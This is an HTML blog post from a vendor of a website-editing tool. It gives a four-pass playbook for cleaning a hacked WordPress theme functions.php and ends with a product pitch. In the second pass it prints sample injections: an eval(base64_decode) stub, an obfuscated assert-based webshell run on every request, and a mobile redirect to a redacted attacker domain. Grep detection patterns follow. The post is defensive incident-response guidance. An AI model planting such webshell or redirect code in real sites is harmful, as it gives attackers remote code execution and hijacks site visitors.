@@ -1,0 +1,448 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+
+<title>WordPress functions.php hack: a four-pass cleanup playbook · Pier — Blog</title>
+<meta name="description" content="A hacked theme functions.php is rarely alone. Here is the four-pass cleanup we run on WordPress sites before anyone goes near wp-options or wp-posts.">
+<meta name="author" content="Pier editorial">
+<meta name="robots" content="index,follow,max-snippet:-1,max-image-preview:large,max-video-preview:-1">
+<meta name="keywords" content="wordpress, php, security, htaccess, workflow">
+
+<link rel="canonical" href="https://pier.abn.company/blog/wordpress-functions-php-hack-cleanup/">
+<link rel="alternate" hreflang="en" href="https://pier.abn.company/blog/wordpress-functions-php-hack-cleanup/">
+<link rel="alternate" hreflang="nl" href="https://pier.abn.company/nl/blog/wordpress-functions-php-hack-cleanup/">
+<link rel="alternate" hreflang="x-default" href="https://pier.abn.company/blog/wordpress-functions-php-hack-cleanup/">
+<link rel="alternate" type="application/rss+xml" title="Pier — Blog" href="https://pier.abn.company/blog/feed.xml">
+
+<meta property="og:type" content="article">
+<meta property="og:site_name" content="Pier">
+<meta property="og:title" content="WordPress functions.php hack: a four-pass cleanup playbook">
+<meta property="og:description" content="A hacked theme functions.php is rarely alone. Here is the four-pass cleanup we run on WordPress sites before anyone goes near wp-options or wp-posts.">
+<meta property="og:url" content="https://pier.abn.company/blog/wordpress-functions-php-hack-cleanup/">
+<meta property="og:image" content="https://pier.abn.company/blog/wordpress-functions-php-hack-cleanup/hero.jpg">
+<meta property="og:image:secure_url" content="https://pier.abn.company/blog/wordpress-functions-php-hack-cleanup/hero.jpg">
+<meta property="og:image:type" content="image/jpeg">
+<meta property="og:image:width" content="2000">
+<meta property="og:image:height" content="1333">
+<meta property="og:image:alt" content="Overhead desk with functions.php run-sheet, manila folder tab, diff sheets, index card, brass plate, fountain pen, wax seal.">
+<meta property="og:locale" content="en_US">
+<meta property="og:locale:alternate" content="nl_NL">
+<meta property="article:published_time" content="2026-06-11T03:03:44.698Z">
+<meta property="article:modified_time" content="2026-06-11T03:03:44.698Z">
+<meta property="article:author" content="Pier editorial">
+<meta property="article:publisher" content="https://abn.company/">
+<meta property="article:section" content="WordPress">
+<meta property="article:tag" content="wordpress">
+<meta property="article:tag" content="php">
+<meta property="article:tag" content="security">
+<meta property="article:tag" content="htaccess">
+<meta property="article:tag" content="workflow">
+
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:site" content="@JacobAbn">
+<meta name="twitter:creator" content="@JacobAbn">
+<meta name="twitter:title" content="WordPress functions.php hack: a four-pass cleanup playbook">
+<meta name="twitter:description" content="A hacked theme functions.php is rarely alone. Here is the four-pass cleanup we run on WordPress sites before anyone goes near wp-options or wp-posts.">
+<meta name="twitter:image" content="https://pier.abn.company/blog/wordpress-functions-php-hack-cleanup/hero.jpg">
+<meta name="twitter:image:alt" content="Overhead desk with functions.php run-sheet, manila folder tab, diff sheets, index card, brass plate, fountain pen, wax seal.">
+<meta name="twitter:label1" content="Reading time">
+<meta name="twitter:data1" content="9 min read">
+<meta name="twitter:label2" content="Filed under">
+<meta name="twitter:data2" content="WordPress">
+
+<meta name="theme-color" content="#eeece6">
+<meta name="color-scheme" content="light">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-title" content="Pier">
+<meta name="format-detection" content="telephone=no">
+<meta name="referrer" content="strict-origin-when-cross-origin">
+
+<link rel="icon" href="/favicon.svg" type="image/svg+xml">
+<link rel="alternate icon" href="/favicon.ico">
+<link rel="apple-touch-icon" href="/apple-touch-icon.png">
+<link rel="mask-icon" href="/favicon.svg" color="#0d0d0d">
+
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link rel="preload" as="image" href="/blog/wordpress-functions-php-hack-cleanup/hero.webp" type="image/webp" fetchpriority="high">
+<link rel="preload" as="style" href="https://fonts.googleapis.com/css2?family=Geist:wght@400;500;600&family=JetBrains+Mono:wght@400;500&display=swap">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Geist:wght@400;500;600&family=JetBrains+Mono:wght@400;500&display=swap" media="print" onload="this.media='all'">
+<noscript><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Geist:wght@400;500;600&family=JetBrains+Mono:wght@400;500&display=swap"></noscript>
+<link rel="stylesheet" href="/styles.css">
+
+<!-- JSON-LD: Organization (stable @id used by other graphs) -->
+<script type="application/ld+json">
+{
+  "@context":"https://schema.org",
+  "@type":"Organization",
+  "@id":"https://abn.company/#org",
+  "name":"A Brand New Company B.V.",
+  "alternateName":"ABN",
+  "url":"https://abn.company/",
+  "logo":{"@type":"ImageObject","url":"https://pier.abn.company/logo.svg","width":32,"height":32},
+  "taxID":"NL004626508B12",
+  "vatID":"NL004626508B12",
+  "identifier":[{"@type":"PropertyValue","propertyID":"KvK","value":"88565548"}],
+  "sameAs":[
+    "https://abn.company/",
+    "https://pier.abn.company/",
+    "https://twitter.com/JacobAbn",
+    "https://github.com/jacobabn"
+  ],
+  "address":{"@type":"PostalAddress","addressCountry":"NL","addressLocality":"Amsterdam"}
+}
+</script>
+
+<!-- JSON-LD: WebSite -->
+<script type="application/ld+json">
+{
+  "@context":"https://schema.org",
+  "@type":"WebSite",
+  "@id":"https://pier.abn.company/#website",
+  "url":"https://pier.abn.company/",
+  "name":"Pier",
+  "inLanguage":["en","nl"],
+  "publisher":{"@id":"https://abn.company/#org"}
+}
+</script>
+
+<!-- JSON-LD: BlogPosting -->
+<script type="application/ld+json">
+{
+  "@context":"https://schema.org",
+  "@type":"BlogPosting",
+  "@id":"https://pier.abn.company/blog/wordpress-functions-php-hack-cleanup/#post",
+  "isPartOf":{"@id":"https://pier.abn.company/#website"},
+  "mainEntityOfPage":{"@type":"WebPage","@id":"https://pier.abn.company/blog/wordpress-functions-php-hack-cleanup/"},
+  "url":"https://pier.abn.company/blog/wordpress-functions-php-hack-cleanup/",
+  "headline":"WordPress functions.php hack: a four-pass cleanup playbook",
+  "description":"A hacked theme functions.php is rarely alone. Here is the four-pass cleanup we run on WordPress sites before anyone goes near wp-options or wp-posts.",
+  "image":{
+    "@type":"ImageObject",
+    "url":"https://pier.abn.company/blog/wordpress-functions-php-hack-cleanup/hero.jpg",
+    "width":2000,
+    "height":1333,
+    "caption":"Overhead desk with functions.php run-sheet, manila folder tab, diff sheets, index card, brass plate, fountain pen, wax seal."
+  },
+  "datePublished":"2026-06-11T03:03:44.698Z",
+  "dateModified":"2026-06-11T03:03:44.698Z",
+  "author":{
+    "@type":"Person",
+    "name":"Jacob Molkenboer",
+    "url":"https://abn.company/",
+    "sameAs":["https://twitter.com/JacobAbn"]
+  },
+  "publisher":{"@id":"https://abn.company/#org"},
+  "inLanguage":"en",
+  "keywords":"wordpress, php, security, htaccess, workflow",
+  "wordCount":1546,
+  "articleSection":"WordPress",
+  "articleBody":"The first Loom landed at 23:41. A small Dutch agency we work with had taken on emergency hosting for a five-year-old legacy site running WordPress, the kind that serves a single product brochure and a contact form. The previous developer had vanished. The site was still serving pages, but every third page-load now redirected mobile users to a Telegram funnel hosted on a .ru domain. The agency lead opened wp-content/themes/saledine/functions.php and the first 11 lines were a wall of eval(base64_decode( followed by a 4,200-character string. That is the moment the question stops being \"is this hacked\" and starts being \"how much else is hacked.\" The WordPress functions.php injection is almost never the whole story. Treating it as the whole story is how you spend three hours cleaning the visible payload and then watch it return at 03:00, because a sibling implant in mu-plugins/ re-wrote the file on a cron tick. Below is the four-pass cleanup we run on a hacked WordPress site before we touch the database. The order matters. The database is the most expensive thing to clean and the most expensive thing to break, so we leave it for last. Pass one: freeze the patient The first thing we do is stop the site from helping the attacker. That does not mean taking the site offline. Most agencies cannot afford to dark-page a client's storefront for the four hours a real cleanup takes. It means three smaller things, all reversible. First, we snapshot the entire docroot to a directory the web user cannot write to. A read-only tarball with a timestamp in the name, stored on a separate disk or pulled down over SFTP. This is your evidence, your rollback, and your diff baseline. Do not skip it because you \"have a backup from last week.\" Last week's backup is from before the attacker burrowed in. tar --exclude='wp-content/cache' --exclude='wp-content/uploads/cache' \\ -czf /var/backups/saledine-$(date +%Y%m%d-%H%M).tgz \\ /var/www/saledine/htdocs chmod 0400 /var/backups/saledine-*.tgz Second, we add a single .htaccess block at the docroot that blocks PHP execution from inside wp-content/uploads/ . This is the most common re-entry point. Even if the attacker has dropped a fresh webshell in uploads/2024/03/ , this stops it dialling home while we work. # /var/www/saledine/htdocs/wp-content/uploads/.htaccess <FilesMatch \"\\.(php|phtml|phar|php7|php8)$\"> Require all denied </FilesMatch> Apache's documentation on Require directives covers the syntax. On nginx, the equivalent is a location ~* /wp-content/uploads/.*\\.php$ { deny all; } block in the server config, applied with nginx -s reload . Third, we do not rotate secrets yet. The attacker may still be reading the logs, and rotating now signals that you have noticed. We add a note to rotate at the end of pass four, after we have a clean image to deploy back onto. Pass two: read the visible payload Now the functions.php. Open it in an editor that will not auto-execute anything (so, not your IDE's \"preview\" mode). The first task is to understand what the injection does, not to delete it. Delete-without-reading is how you remove the payload but leave the persistence mechanism in place. A typical WordPress functions.php injection in the last 18 months looks like one of three patterns: // Pattern A: the prepended eval/base64 @eval(base64_decode(\"aWYoaXNzZXQoJF9SRVF...\")); // Pattern B: the obfuscated function function _wp_get_request_data($k) { $a = ['a','s','s','e','r','t']; $f = implode('', $a); return $f($_REQUEST[$k] ?? ''); } add_action('init', '_wp_get_request_data'); // Pattern C: the conditional crawler redirect if (!empty($_SERVER['HTTP_USER_AGENT']) && preg_match('/Mobile|iPhone|Android/i', $_SERVER['HTTP_USER_AGENT']) && !preg_match('/bot|crawl|spider/i', $_SERVER['HTTP_USER_AGENT'])) { @header('Location: https://[redacted].ru/go?id=42'); exit; } Decode the base64 in pattern A by hand, in a sandbox. Do not pipe it into eval on a live server, but also do not paste it into a public web decoder, because the payload usually contains the attacker's command-and-control URL and you do not want that URL appearing in a third-party log. echo \"aWYoaXNz...\" | base64 -d on a disconnected VM is enough. What you almost always find is a request handler that takes a command from a POST parameter, runs it through eval , and returns the output. That is your real entry point. The redirect is the noisy symptom. The eval handler is the door. Note what file the payload lives in ( wp-content/themes/saledine/functions.php ), what other strings appear nearby ( aes-256 , gzinflate , str_rot13 ), and what hook it attaches to ( init , wp_loaded , after_setup_theme ). You will grep for those strings in pass three. Pass three: hunt for siblings This is the pass that catches the implants the first pass missed. Every signature you noted in pass two becomes a grep target across the entire docroot, not just the theme directory. cd /var/www/saledine/htdocs grep -rEn --include='*.php' \\ 'eval\\s*\\(\\s*(base64_decode|gzin",
+  "potentialAction":[
+    {"@type":"ReadAction","target":["https://pier.abn.company/blog/wordpress-functions-php-hack-cleanup/"]}
+  ]
+}
+</script>
+
+<!-- JSON-LD: BreadcrumbList -->
+<script type="application/ld+json">
+{
+  "@context":"https://schema.org",
+  "@type":"BreadcrumbList",
+  "itemListElement":[
+    {"@type":"ListItem","position":1,"name":"Pier","item":"https://pier.abn.company/"},
+    {"@type":"ListItem","position":2,"name":"Blog","item":"https://pier.abn.company/blog/"},
+    {"@type":"ListItem","position":3,"name":"WordPress functions.php hack: a four-pass cleanup playbook","item":"https://pier.abn.company/blog/wordpress-functions-php-hack-cleanup/"}
+  ]
+}
+</script>
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "FAQPage",
+  "inLanguage": "en",
+  "mainEntity": [
+    {
+      "@type": "Question",
+      "name": "Should I run a security plugin first?",
+      "acceptedAnswer": {
+        "@type": "Answer",
+        "text": "Not before pass one. Most security plugins write to wp_options and the database, which is exactly what you want to keep clean until you have read every file-system implant."
+      }
+    },
+    {
+      "@type": "Question",
+      "name": "Can I use WP-CLI for this cleanup?",
+      "acceptedAnswer": {
+        "@type": "Answer",
+        "text": "Yes for read-only commands like wp core verify-checksums. Avoid wp option update or wp user delete until pass four is finished and you understand what each implant was doing."
+      }
+    },
+    {
+      "@type": "Question",
+      "name": "How long does the four-pass cleanup take?",
+      "acceptedAnswer": {
+        "@type": "Answer",
+        "text": "A clean run on a small site is about 90 minutes. Sites with multiple implants and a custom theme take three to four hours before you touch the database."
+      }
+    },
+    {
+      "@type": "Question",
+      "name": "What about the host's malware scanner?",
+      "acceptedAnswer": {
+        "@type": "Answer",
+        "text": "Useful as a second opinion after pass four, not before. Host scanners flag known signatures, not behaviour, and they routinely miss mu-plugins and modified core files."
+      }
+    }
+  ]
+}
+</script>
+</head>
+<body>
+
+<a href="#main" class="skip-link">Skip to content</a>
+
+<nav class="nav" aria-label="Primary">
+  <div class="nav-inner">
+    <a href="/" class="brand" aria-label="Pier — home">
+      <svg viewBox="0 0 32 32" aria-hidden="true" fill="none">
+        <rect x="1" y="1" width="30" height="30" stroke="currentColor" stroke-width="1.5"/>
+        <line x1="6" y1="22" x2="26" y2="22" stroke="currentColor" stroke-width="1.5"/>
+        <line x1="16" y1="22" x2="16" y2="12" stroke="currentColor" stroke-width="1.5"/>
+        <rect x="13" y="9" width="6" height="6" fill="#c23d1f"/>
+      </svg>
+      <span>Pier</span>
+    </a>
+    <div class="nav-links">
+      <a href="/#features">Features</a>
+      <a href="/#playbook">Playbook</a>
+      <a href="/blog/">Blog</a>
+      <a href="/#pricing">Pricing</a>
+      <a href="/#faq">FAQ</a>
+    </div>
+    <div class="nav-ctas">
+      <a href="https://pier.abn.company/nl/blog/wordpress-functions-php-hack-cleanup/" class="lang-switch" hreflang="nl" title="Nederlands">NL</a>
+      <a href="https://buy.stripe.com/cNicN67MZeXD3Gt0ui2Nq00" class="pier-buy btn sm">Buy — €199</a>
+    </div>
+  </div>
+</nav>
+
+<main id="main">
+
+<article class="post">
+  <header class="post-head">
+    <div class="shell">
+      <div class="rule">
+        <span>— Article —</span>
+        <span class="spacer"></span>
+        <span>№ 107</span>
+      </div>
+      <p class="eyebrow"><span class="n">107 —</span>WordPress</p>
+      <h1 class="display-l post-title">WordPress functions.php hack: a four-pass cleanup playbook</h1>
+      <p class="lede post-lede">A hacked theme functions.php is rarely alone. Here is the four-pass cleanup we run on WordPress sites before anyone goes near wp-options or wp-posts.</p>
+      <div class="post-meta">
+        <time datetime="2026-06-11T03:03:44.698Z">11 June 2026</time>
+        <span class="dotsep">·</span>
+        <span>9 min read</span>
+        <span class="dotsep">·</span>
+        <span>Pier editorial</span>
+      </div>
+    </div>
+  </header>
+
+  <figure class="post-hero">
+    <picture>
+      <source srcset="/blog/wordpress-functions-php-hack-cleanup/hero.webp" type="image/webp">
+      <img src="/blog/wordpress-functions-php-hack-cleanup/hero.jpg" alt="Overhead desk with functions.php run-sheet, manila folder tab, diff sheets, index card, brass plate, fountain pen, wax seal." width="2000" height="1333" loading="eager" fetchpriority="high" decoding="async">
+    </picture>
+    <figcaption class="hero-cap"><span>Hero · staged still</span><span>№ 107</span></figcaption>
+  </figure>
+
+  <div class="shell post-body-wrap">
+    <div class="post-body">
+      <p>The first Loom landed at 23:41. A small Dutch agency we work with had taken on emergency hosting for a five-year-old <a href="/">legacy site</a> running WordPress, the kind that serves a single product brochure and a contact form. The previous developer had vanished. The site was still serving pages, but every third page-load now redirected mobile users to a Telegram funnel hosted on a .ru domain. The agency lead opened <code>wp-content/themes/saledine/functions.php</code> and the first 11 lines were a wall of <code>eval(base64_decode(</code> followed by a 4,200-character string.</p><p>That is the moment the question stops being "is this hacked" and starts being "how much else is hacked." The WordPress functions.php injection is almost never the whole story. Treating it as the whole story is how you spend three hours cleaning the visible payload and then watch it return at 03:00, because a sibling implant in <code>mu-plugins/</code> re-wrote the file on a cron tick.</p><p>Below is the four-pass cleanup we run on a hacked WordPress site before we touch the database. The order matters. The database is the most expensive thing to clean and the most expensive thing to break, so we leave it for last.</p><h2>Pass one: freeze the patient</h2><p>The first thing we do is stop the site from helping the attacker. That does not mean taking the site offline. Most agencies cannot afford to dark-page a client's storefront for the four hours a real cleanup takes. It means three smaller things, all reversible.</p><p>First, we snapshot the entire docroot to a directory the web user cannot write to. A read-only tarball with a timestamp in the name, stored on a separate disk or pulled down over SFTP. This is your evidence, your rollback, and your diff baseline. Do not skip it because you "have a backup from last week." Last week's backup is from before the attacker burrowed in.</p><pre><code class="lang-bash">tar --exclude='wp-content/cache' --exclude='wp-content/uploads/cache' \
+    -czf /var/backups/saledine-$(date +%Y%m%d-%H%M).tgz \
+    /var/www/saledine/htdocs
+chmod 0400 /var/backups/saledine-*.tgz</code></pre><p>Second, we add a single .htaccess block at the docroot that blocks PHP execution from inside <code>wp-content/uploads/</code>. This is the most common re-entry point. Even if the attacker has dropped a fresh webshell in <code>uploads/2024/03/</code>, this stops it dialling home while we work.</p><pre><code class="lang-apache"># /var/www/saledine/htdocs/wp-content/uploads/.htaccess
+&lt;FilesMatch "\.(php|phtml|phar|php7|php8)$"&gt;
+    Require all denied
+&lt;/FilesMatch&gt;</code></pre><p>Apache's documentation on <a href="https://httpd.apache.org/docs/2.4/mod/mod_authz_core.html#require">Require directives</a> covers the syntax. On nginx, the equivalent is a <code>location ~* /wp-content/uploads/.*\.php$ { deny all; }</code> block in the server config, applied with <code>nginx -s reload</code>.</p><p>Third, we do <em>not</em> rotate secrets yet. The attacker may still be reading the logs, and rotating now signals that you have noticed. We add a note to rotate at the end of pass four, after we have a clean image to deploy back onto.</p><h2>Pass two: read the visible payload</h2><p>Now the functions.php. Open it in an editor that will not auto-execute anything (so, not your IDE's "preview" mode). The first task is to understand what the injection does, not to delete it. Delete-without-reading is how you remove the payload but leave the persistence mechanism in place.</p><p>A typical WordPress functions.php injection in the last 18 months looks like one of three patterns:</p><pre><code class="lang-php">// Pattern A: the prepended eval/base64
+@eval(base64_decode("aWYoaXNzZXQoJF9SRVF..."));
+
+// Pattern B: the obfuscated function
+function _wp_get_request_data($k) {
+    $a = ['a','s','s','e','r','t'];
+    $f = implode('', $a);
+    return $f($_REQUEST[$k] ?? '');
+}
+add_action('init', '_wp_get_request_data');
+
+// Pattern C: the conditional crawler redirect
+if (!empty($_SERVER['HTTP_USER_AGENT']) &&
+    preg_match('/Mobile|iPhone|Android/i', $_SERVER['HTTP_USER_AGENT']) &&
+    !preg_match('/bot|crawl|spider/i', $_SERVER['HTTP_USER_AGENT'])) {
+    @header('Location: https://[redacted].ru/go?id=42');
+    exit;
+}</code></pre><p>Decode the base64 in pattern A by hand, in a sandbox. Do not pipe it into <code>eval</code> on a live server, but also do not paste it into a public web decoder, because the payload usually contains the attacker's command-and-control URL and you do not want that URL appearing in a third-party log. <code>echo "aWYoaXNz..." | base64 -d</code> on a disconnected VM is enough.</p><p>What you almost always find is a request handler that takes a command from a POST parameter, runs it through <code>eval</code>, and returns the output. That is your real entry point. The redirect is the noisy symptom. The eval handler is the door.</p><p>Note what file the payload lives in (<code>wp-content/themes/saledine/functions.php</code>), what other strings appear nearby (<code>aes-256</code>, <code>gzinflate</code>, <code>str_rot13</code>), and what hook it attaches to (<code>init</code>, <code>wp_loaded</code>, <code>after_setup_theme</code>). You will grep for those strings in pass three.</p><h2>Pass three: hunt for siblings</h2><p>This is the pass that catches the implants the first pass missed. Every signature you noted in pass two becomes a grep target across the entire docroot, not just the theme directory.</p><pre><code class="lang-bash">cd /var/www/saledine/htdocs
+grep -rEn --include='*.php' \
+    'eval\s*\(\s*(base64_decode|gzinflate|str_rot13)' \
+    wp-content/ wp-includes/ wp-admin/ 2&gt;/dev/null</code></pre><p>The output is usually longer than the agency lead expected. We have seen sites with the same payload echoed into:</p><ul><li><code>wp-content/mu-plugins/index.php</code> (a must-use plugin auto-loads on every request, no admin action required)</li><li><code>wp-content/plugins/akismet/_inc/akismet-frontend.js.php</code> (a real plugin file path with a fake suffix)</li><li><code>wp-includes/class-wp-hook.php</code> (yes, attackers do edit core)</li><li><code>wp-content/uploads/2024/03/.thumb.php</code> (the uploads payload your .htaccess just blocked)</li></ul><p>Each of those is a separate root cause. Treat them as separate findings, not as duplicates. Read each one in pass-two style before you delete it. Sometimes pattern A in the WordPress functions.php is the decoy, and the real persistence sits in mu-plugins where nobody looks.</p><p>A second useful grep is for the WordPress functions attackers tend to misuse:</p><pre><code class="lang-bash">grep -rEn --include='*.php' \
+    'wp_schedule_(single_)?event|update_option\([^,]*active_plugins' \
+    wp-content/ wp-includes/</code></pre><p>If you find an <code>update_option('active_plugins', ...)</code> call inside a theme file, the attacker is rewriting your plugin list at runtime, which means even your "I disabled all plugins" test was lying to you.</p><aside class="callout">A <code>wp_schedule_event</code> call inside a hacked file means the implant has a heartbeat. Removing the file without unscheduling the cron leaves a ghost row in <code>wp_options</code> that will throw a fatal on every request once the file is gone. Note the hook name now; you will clean it in the database pass.</aside><h2>Pass four: diff against a clean baseline</h2><p>The previous three passes are subtractive. This one is comparative. We download a clean copy of the exact WordPress version the site is running, plus clean copies of every plugin and the theme (if it is a public theme), and we diff the trees.</p><pre><code class="lang-bash"># Get the running version
+grep wp_version /var/www/saledine/htdocs/wp-includes/version.php
+# $wp_version = '6.4.3';
+
+# Pull the matching core
+curl -sLO https://wordpress.org/wordpress-6.4.3.tar.gz
+tar -xzf wordpress-6.4.3.tar.gz -C /tmp/clean/
+
+# Diff the live tree against clean
+diff -rq /tmp/clean/wordpress/wp-includes/ \
+         /var/www/saledine/htdocs/wp-includes/
+diff -rq /tmp/clean/wordpress/wp-admin/ \
+         /var/www/saledine/htdocs/wp-admin/</code></pre><p>Anything that comes back as "Only in" the live tree, or as "differ", is a candidate. Most of it will be benign (a plugin that legitimately writes to <code>wp-content/</code>). Some of it will not. We have found injections inside <code>wp-admin/includes/class-wp-filesystem-ftpext.php</code> this way that no grep would have caught, because the attacker had carefully matched WordPress's own coding style.</p><p>For the theme, if it is a custom build with no upstream, the diff baseline is the tarball from pass one of an earlier backup you trust. The <a href="https://wordpress.org/documentation/article/hardening-wordpress/">WordPress hardening guide</a> lists the file integrity check approach in more detail, but the principle is the same: compare what is running against what should be running, and treat every delta as a question.</p><p>By the end of pass four you have:</p><ul><li>A list of every modified file</li><li>A list of every added file</li><li>A decoded copy of every payload</li><li>A list of every cron hook the implants registered</li><li>A blocked uploads directory</li><li>An untouched database</li></ul><p>That last point is the one that matters. You have not run a single UPDATE. You have not deleted a single row from <code>wp_options</code>. You have not "cleaned" the users table. Everything you have done so far is reversible by restoring the tarball from pass one.</p><h2>Why we wait on the database</h2><p>The database is where a cleanup goes wrong. It is also where the second wave of an attack usually lives: a row in <code>wp_options</code> with <code>autoload = yes</code> that re-injects the theme file on the next page load, a hidden admin user with <code>user_registered</code> backdated to 2019, a <code>wp_usermeta</code> row that grants <code>manage_options</code> to a normal subscriber. None of that is safe to touch until you understand what every implant in the file system was doing, because half the time the file system implant is the read side and the database row is the write side.</p><p>The four passes above give you that understanding. Once you have it, the database work becomes a series of small, targeted queries instead of a panicked <code>wp-cli search-replace</code> that nukes a legitimate widget config along with the malware.</p><p>When we built Pier we kept running into this exact shape of incident on customer sites. The thing we ended up doing was treating the file system and the database as one connected workspace, with <a href="/#features">version history</a> on every edit and a <a href="/#database">MySQL editor</a> that sits next to the SFTP tree, so the four-pass walk and the database cleanup happen in the same window without losing the diff state between them.</p><p>The smallest thing you could do today, even without a live incident, is add the uploads-directory PHP block from pass one to every WordPress site you maintain. It costs nothing, it breaks nothing legitimate, and it removes the single most common re-entry point before you ever need to write the rest of the playbook.</p>
+    </div>
+
+    <aside class="pullquote">Read every implant before you touch the database. The file system tells you what to clean in wp_options; cleaning blind nukes legitimate config along with the malware.</aside>
+
+    
+<section class="post-faq" aria-label="Questions">
+  <p class="rule"><span>— Questions —</span><span class="spacer"></span></p>
+  
+    <div class="faq-item">
+      <p class="faq-q">Should I run a security plugin first?</p>
+      <p class="faq-a">Not before pass one. Most security plugins write to wp_options and the database, which is exactly what you want to keep clean until you have read every file-system implant.</p>
+    </div>
+
+    <div class="faq-item">
+      <p class="faq-q">Can I use WP-CLI for this cleanup?</p>
+      <p class="faq-a">Yes for read-only commands like wp core verify-checksums. Avoid wp option update or wp user delete until pass four is finished and you understand what each implant was doing.</p>
+    </div>
+
+    <div class="faq-item">
+      <p class="faq-q">How long does the four-pass cleanup take?</p>
+      <p class="faq-a">A clean run on a small site is about 90 minutes. Sites with multiple implants and a custom theme take three to four hours before you touch the database.</p>
+    </div>
+
+    <div class="faq-item">
+      <p class="faq-q">What about the host&#39;s malware scanner?</p>
+      <p class="faq-a">Useful as a second opinion after pass four, not before. Host scanners flag known signatures, not behaviour, and they routinely miss mu-plugins and modified core files.</p>
+    </div>
+</section>
+
+    <aside class="pier-card" aria-label="Try Pier">
+      <div class="pier-card-head">
+        <span class="stamp accent">Pier · v1.0</span>
+      </div>
+      <div class="pier-card-body">
+        <h3 class="display-m">Built for the kind of work in this post.</h3>
+        <p class="lede">Pier docks with any FTP/SFTP server and its MySQL database, then lets you edit by chat. Every change is versioned. Every undo is one click. €199 once, two Macs, 30-day refund.</p>
+        <div class="pier-card-ctas">
+          <a href="https://buy.stripe.com/cNicN67MZeXD3Gt0ui2Nq00" class="pier-buy btn">Buy Pier — €199 ↗</a>
+          <a href="/#download" class="btn ghost">Download free trial</a>
+        </div>
+      </div>
+    </aside>
+
+    <nav class="post-tags" aria-label="Filed under">
+      <span class="rule" style="margin:0">
+        <span>— Filed under —</span>
+        <span class="spacer"></span>
+      </span>
+      <ul>
+        <li><a href="/blog/?tag=wordpress">#wordpress</a></li>
+<li><a href="/blog/?tag=php">#php</a></li>
+<li><a href="/blog/?tag=security">#security</a></li>
+<li><a href="/blog/?tag=htaccess">#htaccess</a></li>
+<li><a href="/blog/?tag=workflow">#workflow</a></li>
+      </ul>
+    </nav>
+
+    <nav class="post-related" aria-label="Related reading">
+      
+    <p class="rule"><span>— Related reading —</span><span class="spacer"></span></p>
+    <div class="related-grid">
+      <a class="post-card" href="https://pier.abn.company/blog/htaccess-header-block-cheatsheet/">
+    <span class="pc-img">
+      <picture>
+        <source srcset="/blog/htaccess-header-block-cheatsheet/hero.webp" type="image/webp">
+        <img src="/blog/htaccess-header-block-cheatsheet/hero.jpg" alt="Overhead photo of printed .htaccess cheatsheet, manila folder tab, brass plate, index card, iron key, red wax seal on linen." loading="lazy" decoding="async" width="640" height="427">
+      </picture>
+    </span>
+    <span class="pc-body">
+      <span class="pc-meta"><span class="pc-cat">Security</span><span>·</span><span>10 June 2026</span></span>
+      <h3>.htaccess header block: a security cheatsheet for handover</h3>
+      <span class="pc-lede">A copy-paste .htaccess block of security headers, file locks and PHP-in-uploads kills. Paste once, sleep better, hand the keys back without a knot in your stomach.</span>
+    </span>
+  </a>
+<a class="post-card" href="https://pier.abn.company/blog/web-root-audit-checklist/">
+    <span class="pc-img">
+      <picture>
+        <source srcset="/blog/web-root-audit-checklist/hero.webp" type="image/webp">
+        <img src="/blog/web-root-audit-checklist/hero.jpg" alt="Antique brass ship&#39;s bell on dark oak bracket mounted to bone plaster wall, red frayed cord knotted to clapper." loading="lazy" decoding="async" width="640" height="427">
+      </picture>
+    </span>
+    <span class="pc-body">
+      <span class="pc-meta"><span class="pc-cat">Security</span><span>·</span><span>15 May 2026</span></span>
+      <h3>Public web root: seven file types you should never expose</h3>
+      <span class="pc-lede">A WordPress install live since 2014 will tell you everything about itself if you know which seven files to ask for. None of them should be there.</span>
+    </span>
+  </a>
+    </div>
+    </nav>
+  </div>
+</article>
+
+</main>
+
+<footer class="footer">
+  <div class="shell">
+    <div class="footer-grid">
+      <div>
+        <div class="brand" style="margin-bottom:18px">
+          <svg viewBox="0 0 32 32" width="22" height="22" aria-hidden="true" fill="none">
+            <rect x="1" y="1" width="30" height="30" stroke="currentColor" stroke-width="1.5"/>
+            <line x1="6" y1="22" x2="26" y2="22" stroke="currentColor" stroke-width="1.5"/>
+            <line x1="16" y1="22" x2="16" y2="12" stroke="currentColor" stroke-width="1.5"/>
+            <rect x="13" y="9" width="6" height="6" fill="#c23d1f"/>
+          </svg>
+          <span>Pier</span>
+        </div>
+        <p style="max-width:320px; color:var(--muted); font-size:14px">AI for legacy websites. Native Mac app. Built by ABN in Amsterdam.</p>
+      </div>
+      <div>
+        <h4>Product</h4>
+        <a href="/#features">Features</a>
+        <a href="/#playbook">Playbook</a>
+        <a href="/blog/">Blog</a>
+        <a href="/#pricing">Pricing</a>
+        <a href="/#faq">FAQ</a>
+      </div>
+      <div>
+        <h4>Company</h4>
+        <a href="https://abn.company">ABN</a>
+        <a href="mailto:hello@pier.abn.company">Contact</a>
+        <a href="https://pier.abn.company/nl/blog/wordpress-functions-php-hack-cleanup/">🇳🇱 Nederlands</a>
+      </div>
+      <div>
+        <h4>Legal</h4>
+        <a href="/#">Privacy</a>
+        <a href="/#">Terms</a>
+        <a href="/#">Security</a>
+      </div>
+    </div>
+    <div class="footer-bottom">
+      <span>© 2026 ABN Company · Made on a rainy day in Amsterdam</span>
+      <span class="sp"></span>
+      <span>N 52°22′ · E 04°54′</span>
+    </div>
+  </div>
+</footer>
+
+<script src="/site.js" defer></script>
+</body>
+</html>
